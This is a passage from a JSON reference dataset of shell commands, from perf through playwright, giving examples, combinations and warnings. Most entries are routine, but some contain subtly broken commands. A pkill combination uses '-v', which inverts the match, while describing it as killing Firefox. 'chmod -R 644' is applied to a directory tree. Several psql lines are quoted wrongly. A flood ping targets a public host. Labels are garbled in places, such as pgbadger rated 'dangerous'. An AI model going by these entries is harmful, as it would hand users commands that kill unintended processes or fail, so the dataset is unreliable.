    "syntaxPattern": "perf [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete performance analysis",
        "commands": "perf record -g --call-graph dwarf ./app && perf report --stdio > profile.txt",
        "explanation": "Record detailed call graph and generate text report",
        "title": "perf && perf > profile"
      }
    ],
    "relatedCommands": [
      {
        "name": "strace",
        "relationship": "complementary",
        "reason": "strace traces system calls, perf analyzes CPU performance"
      },
      {
        "name": "gdb",
        "relationship": "complementary",
        "reason": "gdb debugs programs, perf profiles performance"
      }
    ],
    "warnings": [
      "May require root privileges for system-wide profiling",
      "Kernel support needed for advanced features",
      "Output files can be large for long recordings"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://perf.wiki.kernel.org/index.php/Main_Page"
      },
      {
        "platform": "macos",
        "url": "Not available"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "perl",
    "subtitle": "Practical Extraction and Reporting Language",
    "description": "Perl interpreter for text processing and system administration",
    "examples": [
      "perl script.pl  # Execute Perl script file",
      "perl -pe 's/old/new/g' file.txt  # Replace all occurrences of 'old' with 'new' in file",
      "perl -i -pe 's/foo/bar/g' *.txt  # Edit all .txt files in place, replacing 'foo' with 'bar'",
      "perl -lane 'print $F[1]' data.txt  # Extract second field from each line (awk-like behavior)",
      "perl -c script.pl  # Check Perl script for syntax errors",
      "perl -e 'print \"Hello World\\n\"'  # Run Perl code from command line",
      "perl -F, -lane 'print $F[0] if $F[2] > 100' data.csv  # Print first field where third field is greater than 100",
      "perl -pe 's/old/new/g' file.txt > output.txt  # Replace text with regex and save to new file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "perl [options] <file> [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Advanced text processing pipeline",
        "commands": "perl -pe 's/^/> /' input.txt | perl -pe 's/$/;/' > output.txt",
        "explanation": "Add prefix and suffix to each line using Perl pipeline",
        "title": "perl > | perl ; > output"
      },
      {
        "scenario": "Install CPAN module and use",
        "commands": "cpan install JSON && perl -MJSON -e 'print encode_json({hello => \"world\"})'",
        "explanation": "Install JSON module and use it to encode data",
        "title": "cpan && perl >"
      }
    ],
    "relatedCommands": [
      {
        "name": "sed",
        "relationship": "similar",
        "reason": "Both used for text processing, Perl more powerful"
      },
      {
        "name": "awk",
        "relationship": "similar",
        "reason": "Both process structured text, different syntax"
      },
      {
        "name": "cpan",
        "relationship": "combo",
        "reason": "CPAN installs Perl modules and libraries"
      }
    ],
    "warnings": [
      "Perl one-liners can become cryptic and hard to maintain",
      "Regular expression syntax differs slightly from other tools",
      "Module installation may require compilation tools"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://perldoc.perl.org/"
      },
      {
        "platform": "macos",
        "url": "https://perldoc.perl.org/"
      },
      {
        "platform": "windows",
        "url": "https://perldoc.perl.org/"
      },
      {
        "platform": "generic",
        "url": "https://perldoc.perl.org/perlintro"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pg_basebackup",
    "subtitle": "PostgreSQL Base Backup",
    "description": "PostgreSQL physical backup utility for streaming replication",
    "examples": [
      "pg_basebackup -h localhost -U postgres -D /backup/base -Ft -z -P  # Create compressed tar format base backup with progress",
      "pg_basebackup -h primary -U replicator -D /var/lib/postgresql/standby -W -R  # Create backup and recovery.conf for standby setup",
      "pg_basebackup -h localhost -U postgres -D /backup -X stream -P  # Stream WAL files during backup for consistency",
      "pg_basebackup -h localhost -U postgres -D /backup -c fast --verify-checksums  # Fast checkpoint with checksum verification"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pg_basebackup [options]",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Automated standby setup",
        "commands": "pg_basebackup -h primary -U replicator -D /standby -R -P && chmod 600 /standby/recovery.conf",
        "explanation": "Create standby backup and secure recovery config",
        "title": "pg_basebackup && chmod"
      }
    ],
    "relatedCommands": [
      {
        "name": "pg_receivewal",
        "relationship": "combo",
        "reason": "Continuously receives WAL files for backup"
      },
      {
        "name": "pg_ctl",
        "relationship": "combo",
        "reason": "Controls PostgreSQL server for standby operations"
      }
    ],
    "warnings": [
      "Requires replication permissions in pg_hba.conf",
      "Large databases may take significant time and bandwidth",
      "WAL archiving must be configured for point-in-time recovery"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.postgresql.org/docs/current/app-pgbasebackup.html"
      },
      {
        "platform": "macos",
        "url": "https://www.postgresql.org/docs/current/app-pgbasebackup.html"
      },
      {
        "platform": "windows",
        "url": "https://www.postgresql.org/docs/current/app-pgbasebackup.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pg_dump",
    "subtitle": "PostgreSQL Dump",
    "description": "PostgreSQL database backup utility with advanced options",
    "examples": [
      "pg_dump -h localhost -U postgres -d mydb > backup.sql  # Create complete SQL dump of database",
      "pg_dump -Fc -h localhost -U postgres -d mydb -f backup.dump  # Create compressed custom format backup",
      "pg_dump -s -h localhost -U postgres -d mydb > schema.sql  # Export only database schema without data",
      "pg_dump -a -h localhost -U postgres -d mydb > data.sql  # Export only data without schema",
      "pg_dump -t users -h localhost -U postgres -d mydb > users_table.sql  # Backup specific table only",
      "pg_dump -T logs -T temp_* -h localhost -U postgres -d mydb > backup.sql  # Backup database excluding certain tables",
      "pg_dump -Fd -j 4 -h localhost -U postgres -d mydb -f backup_dir/  # Create parallel backup using 4 worker processes",
      "pg_dump -h remote.server.com -U postgres -d mydb | gzip > remote_backup.sql.gz  # Backup remote database with gzip compression"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pg_dump [options] [database]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Automated backup with date",
        "commands": "pg_dump -Fc -h localhost -U postgres -d mydb -f backup_$(date +%Y%m%d_%H%M%S).dump && find /backups -name '*.dump' -mtime +7 -delete",
        "explanation": "Create timestamped backup and clean old backups",
        "title": "pg_dump && find"
      }
    ],
    "relatedCommands": [
      {
        "name": "pg_restore",
        "relationship": "combo",
        "reason": "Restores dumps created by pg_dump"
      },
      {
        "name": "psql",
        "relationship": "combo",
        "reason": "Can restore SQL dumps created by pg_dump"
      }
    ],
    "warnings": [
      "Custom format (-Fc) provides better compression and flexibility",
      "Large databases may require --verbose for progress monitoring",
      "Password authentication can be handled via PGPASSWORD environment variable"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.postgresql.org/docs/current/app-pgdump.html"
      },
      {
        "platform": "macos",
        "url": "https://www.postgresql.org/docs/current/app-pgdump.html"
      },
      {
        "platform": "windows",
        "url": "https://www.postgresql.org/docs/current/app-pgdump.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pg_restore",
    "subtitle": "PostgreSQL Restore",
    "description": "PostgreSQL database restore utility for custom format backups",
    "examples": [
      "pg_restore -h localhost -U postgres -d newdb backup.dump  # Restore database from custom format backup",
      "pg_restore -j 4 -h localhost -U postgres -d newdb backup.dump  # Restore using 4 parallel worker processes",
      "pg_restore -t users -h localhost -U postgres -d mydb backup.dump  # Restore only specific table from backup",
      "pg_restore -c -h localhost -U postgres -d mydb backup.dump  # Drop existing objects before restoring",
      "pg_restore -C -h localhost -U postgres -d postgres backup.dump  # Create target database and restore data",
      "pg_restore -l backup.dump  # Show contents of backup file without restoring",
      "pg_restore -v -h localhost -U postgres -d mydb backup.dump  # Show detailed progress during restore"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pg_restore [options] [filename]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Selective restore workflow",
        "commands": "pg_restore -l backup.dump > restore_list.txt && pg_restore -L restore_list.txt -h localhost -U postgres -d mydb backup.dump",
        "explanation": "Create restore list, edit it, then restore selectively",
        "title": "pg_restore > restore_list && pg_restore"
      }
    ],
    "relatedCommands": [
      {
        "name": "pg_dump",
        "relationship": "combo",
        "reason": "Creates backups that pg_restore can restore"
      },
      {
        "name": "createdb",
        "relationship": "combo",
        "reason": "Often used to create target database before restore"
      }
    ],
    "warnings": [
      "Only works with custom format (-Fc), directory (-Fd), or tar (-Ft) backups",
      "Target database must exist unless using -C option",
      "Parallel restore may not preserve exact ordering of operations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.postgresql.org/docs/current/app-pgrestore.html"
      },
      {
        "platform": "macos",
        "url": "https://www.postgresql.org/docs/current/app-pgrestore.html"
      },
      {
        "platform": "windows",
        "url": "https://www.postgresql.org/docs/current/app-pgrestore.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pg_stat_activity",
    "subtitle": "PostgreSQL Statistics Activity",
    "description": "PostgreSQL system view for monitoring active database connections",
    "examples": [
      "psql -c 'SELECT pid, usename, datname, state, query FROM pg_stat_activity;'  # Show all current database connections and their queries",
      "psql -c 'SELECT pid, now() - pg_stat_activity.query_start AS duration, query FROM pg_stat_activity WHERE state = \\'active\\' ORDER BY duration DESC;'  # Show active queries ordered by execution time",
      "psql -c 'SELECT pg_terminate_backend(12345);'  # Terminate connection with specific process ID",
      "psql -c 'SELECT datname, count(*) as connections FROM pg_stat_activity GROUP BY datname;'  # Show connection count per database",
      "psql -c 'SELECT a.pid as blocked_pid, a.query as blocked_query, b.pid as blocking_pid, b.query as blocking_query FROM pg_stat_activity a JOIN pg_locks l ON l.pid = a.pid JOIN pg_locks l2 ON l2.transactionid = l.transactionid JOIN pg_stat_activity b ON b.pid = l2.pid WHERE a.pid != b.pid AND NOT l.granted;'  # Identify queries blocking other queries",
      "psql -c 'SELECT * FROM pg_stat_activity WHERE usename = \\'appuser\\' AND state = \\'active\\';'  # Show active queries for specific user"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "psql -c 'SELECT * FROM pg_stat_activity [WHERE conditions]'",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Database health monitoring",
        "commands": "psql -c 'SELECT count(*) as total_connections FROM pg_stat_activity;' && psql -c 'SELECT count(*) as active_queries FROM pg_stat_activity WHERE state = \\'active\\';'",
        "explanation": "Check total connections and active query count",
        "title": "psql ; && psql ;"
      }
    ],
    "relatedCommands": [
      {
        "name": "pg_stat_statements",
        "relationship": "combo",
        "reason": "Provides query performance statistics"
      },
      {
        "name": "pg_locks",
        "relationship": "combo",
        "reason": "Shows lock information for troubleshooting"
      }
    ],
    "warnings": [
      "Requires appropriate privileges to view all connections",
      "Process IDs change when connections restart",
      "pg_terminate_backend() forcefully kills connections"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.postgresql.org/docs/current/monitoring-stats.html#MONITORING-PG-STAT-ACTIVITY-VIEW"
      },
      {
        "platform": "macos",
        "url": "https://www.postgresql.org/docs/current/monitoring-stats.html#MONITORING-PG-STAT-ACTIVITY-VIEW"
      },
      {
        "platform": "windows",
        "url": "https://www.postgresql.org/docs/current/monitoring-stats.html#MONITORING-PG-STAT-ACTIVITY-VIEW"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pgbadger",
    "subtitle": "PostgreSQL Badger",
    "description": "PostgreSQL log analyzer and performance monitoring tool",
    "examples": [
      "pgbadger /var/log/postgresql/postgresql.log  # Generate HTML report from PostgreSQL log file",
      "pgbadger /var/log/postgresql/postgresql-*.log  # Process multiple log files in single report",
      "pgbadger --begin '2023-12-01 00:00:00' --end '2023-12-01 23:59:59' postgresql.log  # Analyze logs for specific time period",
      "pgbadger --incremental --outdir /reports postgresql.log  # Process logs incrementally for continuous monitoring",
      "pgbadger --dbname myapp postgresql.log  # Analyze queries only for specific database",
      "pgbadger --format csv postgresql.log  # Generate CSV output instead of HTML",
      "pgbadger --top 20 postgresql.log  # Show top 20 queries by various metrics",
      "pgbadger --exclude-query 'SELECT.*pg_stat' postgresql.log  # Exclude monitoring queries from analysis"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "pgbadger [options] logfile(s)",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Daily performance monitoring",
        "commands": "pgbadger --incremental --outdir /var/www/html/pgbadger /var/log/postgresql/postgresql.log && chmod -R 644 /var/www/html/pgbadger",
        "explanation": "Generate daily reports and make them web-accessible",
        "title": "pgbadger && chmod"
      }
    ],
    "relatedCommands": [
      {
        "name": "psql",
        "relationship": "combo",
        "reason": "PostgreSQL client for database operations"
      },
      {
        "name": "pg_stat_statements",
        "relationship": "alternative",
        "reason": "Built-in PostgreSQL query statistics extension"
      }
    ],
    "warnings": [
      "Requires properly configured PostgreSQL logging settings",
      "Large log files may require significant processing time",
      "Log format must match expected PostgreSQL format"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/darold/pgbadger"
      },
      {
        "platform": "macos",
        "url": "https://github.com/darold/pgbadger"
      },
      {
        "platform": "windows",
        "url": "https://github.com/darold/pgbadger"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pgbench",
    "subtitle": "PostgreSQL Benchmark",
    "description": "PostgreSQL benchmarking and performance testing tool",
    "examples": [
      "pgbench -i -s 10 testdb  # Initialize test database with scale factor 10",
      "pgbench -c 10 -j 2 -t 1000 testdb  # Run benchmark with 10 clients, 2 threads, 1000 transactions each",
      "pgbench -c 20 -j 4 -T 300 testdb  # Run benchmark for 300 seconds with 20 clients",
      "pgbench -c 10 -t 1000 -S testdb  # Run select-only benchmark test",
      "pgbench -c 10 -t 1000 -f custom_script.sql testdb  # Run benchmark with custom transaction script",
      "pgbench -c 10 -T 300 -P 10 testdb  # Show progress every 10 seconds during test",
      "pgbench -c 1 -t 100 -C testdb  # Test with new connection for each transaction",
      "pgbench -c 10 -t 1000 --vacuum-all testdb  # Vacuum all tables before running benchmark"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pgbench [options] [database]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive performance test",
        "commands": "pgbench -i -s 100 testdb && pgbench -c 50 -j 4 -T 600 -P 30 testdb > benchmark_results.txt",
        "explanation": "Initialize large test database and run extended benchmark",
        "title": "pgbench && pgbench > benchmark_results"
      }
    ],
    "relatedCommands": [
      {
        "name": "psql",
        "relationship": "combo",
        "reason": "Used to create test database for pgbench"
      },
      {
        "name": "pg_stat_activity",
        "relationship": "combo",
        "reason": "Monitor active connections during benchmark"
      }
    ],
    "warnings": [
      "Initialization creates test tables that may consume significant space",
      "Scale factor determines database size (scale 1 = ~15MB)",
      "Results vary significantly based on hardware and configuration"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.postgresql.org/docs/current/pgbench.html"
      },
      {
        "platform": "macos",
        "url": "https://www.postgresql.org/docs/current/pgbench.html"
      },
      {
        "platform": "windows",
        "url": "https://www.postgresql.org/docs/current/pgbench.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pgrep",
    "subtitle": "process grep",
    "description": "Find process IDs based on name and other criteria",
    "examples": [
      "pgrep firefox  # Get process IDs of all Firefox processes",
      "pgrep -f 'python server.py'  # Match against full command line, not just process name",
      "pgrep -n nginx  # Return only the most recently started nginx process",
      "pgrep -u www-data  # Get all process IDs owned by www-data user",
      "pgrep -l python  # Show both process ID and name for Python processes"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pgrep [options] <pattern>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Kill all processes matching pattern",
        "commands": "pgrep firefox | xargs kill",
        "explanation": "Find Firefox processes and terminate them",
        "title": "pgrep | xargs"
      },
      {
        "scenario": "Monitor process count",
        "commands": "watch 'echo \"Apache processes: $(pgrep apache2 | wc -l)\"'",
        "explanation": "Continuously monitor number of Apache processes",
        "title": "watch | wc"
      }
    ],
    "relatedCommands": [
      {
        "name": "pkill",
        "relationship": "combo",
        "reason": "Kill processes using same pattern matching"
      },
      {
        "name": "ps",
        "relationship": "alternative",
        "reason": "More detailed process information but less convenient filtering"
      },
      {
        "name": "pidof",
        "relationship": "simple",
        "reason": "Simpler tool for finding PIDs by program name"
      }
    ],
    "warnings": [
      "pgrep matches against process names, not full paths by default",
      "Pattern is a regular expression, not shell glob",
      "Empty result means no matching processes found"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/pgrep.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/pgrep.html"
      },
      {
        "platform": "generic",
        "url": "https://gitlab.com/procps-ng/procps"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "php",
    "subtitle": "PHP: Hypertext Preprocessor",
    "description": "PHP interpreter for web development and scripting",
    "examples": [
      "php script.php  # Run PHP script from command line",
      "php -S localhost:8000  # Start development web server on port 8000",
      "php -l script.php  # Lint PHP file for syntax errors without execution",
      "php -a  # Start interactive PHP command line shell",
      "php -r \"echo date('Y-m-d H:i:s');\"  # Run PHP code from command line without file",
      "php --ini  # Display PHP configuration files locations",
      "php composer.phar install  # Use PHP to run Composer dependency manager"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "php [options] <file> [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development workflow",
        "commands": "php -l index.php && php -S localhost:8000",
        "explanation": "Check syntax then start development server",
        "title": "php && php"
      },
      {
        "scenario": "Run tests with PHPUnit",
        "commands": "php vendor/bin/phpunit tests/",
        "explanation": "Execute PHP unit tests using PHPUnit",
        "title": "php"
      }
    ],
    "relatedCommands": [
      {
        "name": "composer",
        "relationship": "combo",
        "reason": "Composer manages PHP dependencies and autoloading"
      },
      {
        "name": "apache2",
        "relationship": "combo",
        "reason": "Apache web server commonly runs PHP applications"
      },
      {
        "name": "mysql",
        "relationship": "combo",
        "reason": "MySQL often used as database for PHP applications"
      }
    ],
    "warnings": [
      "PHP configuration differs between CLI and web server",
      "Memory limits and execution time limits apply",
      "Extension availability varies between installations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.php.net/manual/en/features.commandline.php"
      },
      {
        "platform": "macos",
        "url": "https://www.php.net/manual/en/features.commandline.php"
      },
      {
        "platform": "windows",
        "url": "https://www.php.net/manual/en/features.commandline.php"
      },
      {
        "platform": "generic",
        "url": "https://www.php.net/manual/en/tutorial.php"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pidstat",
    "subtitle": "Process ID Statistics",
    "description": "Monitor and report statistics for individual processes",
    "examples": [
      "pidstat 2 5  # Show process statistics every 2 seconds for 5 iterations",
      "pidstat -u  # Display CPU usage statistics for all processes",
      "pidstat -r  # Show memory usage statistics per process",
      "pidstat -d  # Display I/O statistics for all processes",
      "pidstat -p 1234  # Monitor statistics for specific process ID",
      "pidstat -t  # Display statistics including threads"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pidstat [options] [interval] [count]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive process analysis",
        "commands": "pidstat -u 1 5 && pidstat -r 1 5 && pidstat -d 1 5",
        "explanation": "Analyze CPU, memory, and I/O for all processes",
        "title": "pidstat && pidstat && pidstat"
      }
    ],
    "relatedCommands": [
      {
        "name": "ps",
        "relationship": "complementary",
        "reason": "ps shows process information, pidstat shows performance metrics"
      },
      {
        "name": "top",
        "relationship": "similar",
        "reason": "Both monitor process performance but pidstat is more detailed"
      }
    ],
    "warnings": [
      "Part of sysstat package",
      "Linux-specific tool",
      "Can show thread-level details with -t option"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/pidstat.1.html"
      },
      {
        "platform": "macos",
        "url": "Not available"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ping",
    "subtitle": "Packet Internet Groper",
    "description": "Network diagnostic tool for measuring connectivity and latency",
    "examples": [
      "ping google.com  # Test basic connectivity to Google",
      "ping -c 4 google.com  # Send only 4 ping packets",
      "ping -i 2 google.com  # Send pings every 2 seconds",
      "ping -D google.com  # Include timestamp in ping output",
      "sudo ping -f google.com  # Send pings as fast as possible"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "caution",
    "syntaxPattern": "ping [options] <hostname|IP>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Network latency monitoring",
        "commands": "ping -c 100 -i 0.5 google.com | tail -1",
        "explanation": "Measure network latency with statistics",
        "title": "ping | tail"
      }
    ],
    "relatedCommands": [
      {
        "name": "traceroute",
        "relationship": "combo",
        "reason": "Traces network path while ping tests connectivity"
      },
      {
        "name": "mtr",
        "relationship": "enhancement",
        "reason": "Combines ping and traceroute functionality"
      }
    ],
    "warnings": [
      "Some networks block ICMP packets",
      "Flood ping requires root privileges",
      "Windows ping syntax differs slightly"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/ping.8.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/ping.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/ping"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pip",
    "subtitle": "Pip Installs Packages",
    "description": "Python package installer",
    "examples": [
      "pip install requests  # Install requests library for HTTP operations",
      "pip install django==3.2  # Install specific version of Django framework",
      "pip install -r requirements.txt  # Install all packages listed in requirements file",
      "pip install --upgrade numpy  # Update numpy to latest available version",
      "pip show pandas  # Display information about installed pandas package",
      "pip list  # Show all installed Python packages"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "caution",
    "syntaxPattern": "pip <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create requirements file",
        "commands": "pip freeze > requirements.txt",
        "explanation": "Export current environment packages to requirements file",
        "title": "pip > requirements"
      },
      {
        "scenario": "Upgrade all packages",
        "commands": "pip list --outdated --format=freeze | grep -v '^-e' | cut -d = -f 1 | xargs -n1 pip install -U",
        "explanation": "Upgrade all outdated packages (Linux/macOS)",
        "title": "pip | grep | cut | xargs"
      }
    ],
    "relatedCommands": [
      {
        "name": "python",
        "relationship": "combo",
        "reason": "pip installs packages for Python interpreter"
      },
      {
        "name": "virtualenv",
        "relationship": "combo",
        "reason": "Create isolated Python environments for pip installs"
      },
      {
        "name": "conda",
        "relationship": "alternative",
        "reason": "Alternative package manager with broader ecosystem"
      }
    ],
    "warnings": [
      "Use pip3 explicitly on systems with both Python 2 and 3",
      "Global installs may require sudo or cause conflicts",
      "Always use virtual environments for projects"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://pip.pypa.io/en/stable/"
      },
      {
        "platform": "macos",
        "url": "https://pip.pypa.io/en/stable/"
      },
      {
        "platform": "windows",
        "url": "https://pip.pypa.io/en/stable/"
      },
      {
        "platform": "generic",
        "url": "https://pip.pypa.io/en/stable/cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pipenv",
    "subtitle": "Pip Environment",
    "description": "Python development workflow tool combining pip and virtualenv",
    "examples": [
      "pipenv install requests  # Add requests to Pipfile and install in virtual environment",
      "pipenv install pytest --dev  # Install pytest as development dependency",
      "pipenv shell  # Spawn shell with project virtual environment activated",
      "pipenv run python app.py  # Execute Python script in project virtual environment",
      "pipenv requirements > requirements.txt  # Export Pipfile.lock to requirements.txt format"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "pipenv <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Fresh environment setup",
        "commands": "pipenv --rm && pipenv install && pipenv install --dev",
        "explanation": "Remove old environment and reinstall all dependencies",
        "title": "pipenv && pipenv && pipenv"
      }
    ],
    "relatedCommands": [
      {
        "name": "pip",
        "relationship": "combo",
        "reason": "Pipenv uses pip under the hood"
      },
      {
        "name": "poetry",
        "relationship": "alternative",
        "reason": "More modern Python dependency manager"
      }
    ],
    "warnings": [
      "Pipfile.lock should be committed for production",
      "Can be slower than other package managers",
      "Virtual environment location varies by system"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://pipenv.pypa.io/en/latest/commands.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pkill",
    "subtitle": "process kill",
    "description": "Kill processes based on name and other criteria",
    "examples": [
      "pkill firefox  # Terminate all Firefox processes",
      "pkill -TERM nginx  # Send TERM signal to all nginx processes for graceful shutdown",
      "pkill -u testuser  # Terminate all processes owned by testuser",
      "pkill -f 'python server.py'  # Kill processes based on full command line match",
      "pkill -o chrome  # Terminate only the oldest Chrome process",
      "pgrep -f apache2  # Find Apache processes by command line"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pkill [options] <pattern>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Gracefully stop then force kill",
        "commands": "pkill -TERM myapp; sleep 5; pkill -KILL myapp",
        "explanation": "Try graceful shutdown first, then force kill if needed",
        "title": "pkill ; sleep ; pkill"
      },
      {
        "scenario": "Kill processes and confirm",
        "commands": "pkill -v firefox && echo 'Firefox processes terminated'",
        "explanation": "Kill Firefox processes and show what was killed",
        "title": "pkill && echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "pgrep",
        "relationship": "combo",
        "reason": "Find process IDs before killing with pkill pattern"
      },
      {
        "name": "killall",
        "relationship": "similar",
        "reason": "Kill processes by name with different syntax"
      },
      {
        "name": "kill",
        "relationship": "basic",
        "reason": "Kill specific processes by PID"
      }
    ],
    "warnings": [
      "pkill can kill multiple processes at once - be careful with patterns",
      "Default signal is TERM, not KILL",
      "Pattern matching can accidentally kill unintended processes"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/pkill.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/pkill.html"
      },
      {
        "platform": "generic",
        "url": "https://gitlab.com/procps-ng/procps"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "platformio",
    "subtitle": "Platform Input/Output",
    "description": "PlatformIO ecosystem for IoT development",
    "examples": [
      "pio init --board esp32dev  # Creates new PlatformIO project configured for ESP32",
      "pio run  # Compiles the current PlatformIO project",
      "pio run --target upload  # Builds and uploads firmware to connected device",
      "pio device monitor  # Opens serial monitor to view device output",
      "pio lib install 'Adafruit BME280 Library'  # Downloads and installs BME280 sensor library",
      "pio project init --board esp32dev  # Initialize PlatformIO project for ESP32"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pio [command] [options]",
    "prerequisites": [
      "python3",
      "pip"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete development cycle",
        "commands": "pio run && pio run --target upload && pio device monitor",
        "explanation": "Builds project, uploads to device, and starts serial monitoring",
        "title": "pio && pio && pio"
      },
      {
        "scenario": "Clean build and upload",
        "commands": "pio run --target clean && pio run --target upload",
        "explanation": "Cleans previous build artifacts and uploads fresh firmware",
        "title": "pio && pio"
      }
    ],
    "relatedCommands": [
      {
        "name": "arduino-cli",
        "relationship": "alternative",
        "reason": "Arduino-specific development tool with similar functionality"
      },
      {
        "name": "esptool",
        "relationship": "underlying",
        "reason": "Used internally by PlatformIO for ESP32/ESP8266 programming"
      },
      {
        "name": "idf",
        "relationship": "complement",
        "reason": "ESP-IDF framework often used with PlatformIO for advanced ESP32 development"
      }
    ],
    "warnings": [
      "Project must be initialized before running build commands",
      "Device must be connected and accessible for upload operations",
      "Some boards require specific upload protocols or bootloader modes",
      "Library dependencies are automatically resolved but may conflict"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.platformio.org/en/latest/core/installation.html"
      },
      {
        "platform": "macos",
        "url": "https://docs.platformio.org/en/latest/core/installation.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.platformio.org/en/latest/core/installation.html"
      },
      {
        "platform": "generic",
        "url": "https://docs.platformio.org/en/latest/core/quickstart.html"
      }
    ],
    "distroNotes": {
      "windows": "Requires Python and can be installed via pip or installer",
      "linux": "Available through pip or package managers",
      "macos": "Can be installed via pip or Homebrew"
    }
  },
  {
    "name": "playwright",
    "subtitle": "Playwright",
    "description": "Cross-browser automation framework for modern web testing",
    "examples": [
      "playwright install  # Install Chromium, Firefox, and Safari browsers",
      "playwright test  # Run all Playwright tests",
      "playwright test --headed  # Run tests with browser UI visible",
      "playwright codegen https://example.com  # Generate test code by recording browser interactions",
      "playwright test login.spec.js  # Run specific test file",
      "playwright test --debug  # Run tests in debug mode with inspector",
      "playwright test --project=chromium --reporter=html  # Run tests on Chromium with HTML report"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "safe",
    "syntaxPattern": "playwright [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Cross-browser testing",
        "commands": "playwright test --project=chromium --project=firefox --project=webkit",
